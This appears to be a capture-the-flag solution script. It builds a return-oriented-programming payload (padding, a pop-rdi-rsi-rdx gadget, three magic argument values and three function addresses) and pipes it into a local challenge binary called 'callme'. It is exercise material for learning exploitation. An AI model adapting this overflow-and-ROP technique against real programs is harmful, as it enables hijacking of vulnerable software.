import struct
import subprocess

def main():
    elf = './callme'

    padding = b'A'*40
    rdi_val = struct.pack('<Q', 0xdeadbeefdeadbeef)
    rsi_val = struct.pack('<Q', 0xcafebabecafebabe)
    rdx_val = struct.pack('<Q', 0xd00df00dd00df00d)
    pop_rdi_rsi_rdx = struct.pack('<Q', 0x0040093c) + rdi_val + rsi_val + rdx_val
    callme_1 = struct.pack('<Q', 0x00400720)
    callme_2 = struct.pack('<Q', 0x00400740)
    callme_3 = struct.pack('<Q', 0x004006f0)

    payload = padding + pop_rdi_rsi_rdx + callme_1 + pop_rdi_rsi_rdx + callme_2 + pop_rdi_rsi_rdx + callme_3

    p = subprocess.run(elf, input=payload)

if __name__=='__main__':
    main()
